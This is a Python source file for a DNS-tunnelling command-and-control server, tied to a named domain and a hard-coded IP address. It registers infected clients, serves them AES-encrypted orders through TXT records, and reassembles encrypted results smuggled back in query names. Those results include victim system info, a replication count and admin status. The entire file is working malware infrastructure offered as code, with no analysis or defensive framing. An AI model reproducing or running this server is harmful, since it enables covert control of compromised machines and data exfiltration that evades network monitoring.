#!/usr/bin/env python
# coding=utf-8

import sys
import time
import struct
import datetime
import threading
import traceback
import socketserver
from aes import *
from dnslib import *
from client import *

class UDPRequestHandler(socketserver.BaseRequestHandler):

	def get_data(self):
		return self.request[0]

	def send_data(self, data):
		return self.request[1].sendto(data, self.client_address)

	def handle(self):
		try:
			data = self.get_data()
			resp = dns_response(data, self.client_address[0])
			if resp == None:
				return None
			self.send_data(resp)
		except Exception:
			traceback.print_exc(file=sys.stderr)

class DomainName(str):
	def __getattr__(self, item):
		return DomainName(item + '.' + self)

domain = DomainName('seal.ninja.')
IP = '51.83.76.145'
TTL = 60 * 5

soa_record = SOA(
	mname=domain.ns1,  # primary name server
	rname=domain.contact,  # email of the domain administrator
	times=(
		1,  # serial number
		60 * 60 * 1,  # refresh
		60 * 60 * 3,  # retry
		60 * 60 * 24,  # expire
		60 * 60 * 1,  # minimum
	)
)

ns_records = [NS(domain.ns1), NS(domain.ns2)]

records = {
	domain: [A(IP), AAAA((0,) * 16), MX(domain.mail), soa_record] + ns_records,
	domain.ns1: [A(IP)],
	domain.ns2: [A(IP)],
}

response = {}

def dns_response(data, ip):

	request = DNSRecord.parse(data)

	reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)

	qname = str(request.q.qname)
	qtype = request.q.qtype
	qt = QTYPE[qtype]

	if qname == domain or qname.endswith('.' + domain):

		req = qname.split(".")
		print(req)

		#  0       1       2       3       4     5    6
		# up     .gouv   .info
		# re     .id	 .gouv   .info
		# order  .id     .gouv   .info
		# resp   .id  	 .order  .status .data .gouv .info

		if req[0] == "up":
			c = Client(ip)
			clients[c.id] = c
			records[domain.up] = [TXT(str(c.id))]

		if req[0] == "re":
			try:
				c = load(req[1])
			except :
				c = Client(ip,req[1])
			clients[c.id] = c
			key = gen_aes_key(c.id)
			records[req[0]+"."+req[1]+"."+domain] = [TXT(str(aes_encrypt(key, "ok")))]

		if req[0] == "order":
			try :
				client_id = req[1]
				if client_id not in clients.keys():
					return None
				key = gen_aes_key(client_id)
				clients[client_id].heartbeat()
				if not clients[client_id].order:
					clients[client_id].order.append(0)
				records[req[0]+"."+clients[client_id].id+"."+domain] = [TXT(str(aes_encrypt(key, str(clients[client_id].order[0]))))]
				del clients[client_id].order[0]
			except :
				pass

		if req[0] == "resp":
			try :
				respond(req)
			except :
				pass
			key = gen_aes_key(clients[req[1]].id)
			records[req[0]+"."+req[1]+"."+req[2]+"."+req[3]+"."+req[4]+"."+domain] = [TXT(str(aes_encrypt(key, "ok")))]

		for name, rrs in records.items():
			if name == qname:
				for rdata in rrs:
					rqt = rdata.__class__.__name__
					if qt in ['*', rqt]:
						reply.add_answer(RR(rname=qname, rtype=getattr(QTYPE, rqt), rclass=1, ttl=TTL, rdata=rdata))

		for rdata in ns_records:
			reply.add_ar(RR(rname=domain, rtype=QTYPE.NS, rclass=1, ttl=TTL, rdata=rdata))

		reply.add_auth(RR(rname=domain, rtype=QTYPE.SOA, rclass=1, ttl=TTL, rdata=soa_record))
				

	return reply.pack()

def respond(req):
	if req[1] not in response.keys():
		response[req[1]] = {}

	if req[3] == "0": # all-in-one
		key = gen_aes_key(req[1])
		response[req[1]][req[2]] = aes_decrypt(key, req[4])

	elif req[3] == "1": # start
		response[req[1]][req[2]] = req[4]
		return

	elif req[3] == "2": # in progress
		response[req[1]][req[2]] += req[4]
		return

	elif req[3] == "3": # end
		response[req[1]][req[2]] += req[4]
		key = gen_aes_key(req[1])
		response[req[1]][req[2]] = aes_decrypt(key, response[req[1]][req[2]])
	
	if req[2] == "1":
		clients[req[1]].info.parse(response[req[1]][req[2]])
		clients[req[1]].save()
	elif req[2] == "6":
		clients[req[1]].replication = int(response[req[1]][req[2]])
		clients[req[1]].save()
	elif req[2] == "7":
		clients[req[1]].is_admin = response[req[1]][req[2]]
		clients[req[1]].save()

def start_dns():

	server = socketserver.ThreadingUDPServer(('', 53), UDPRequestHandler)
	thread = threading.Thread(target=server.serve_forever)
	thread.daemon = True
	thread.start()

	while True:
		time.sleep(1)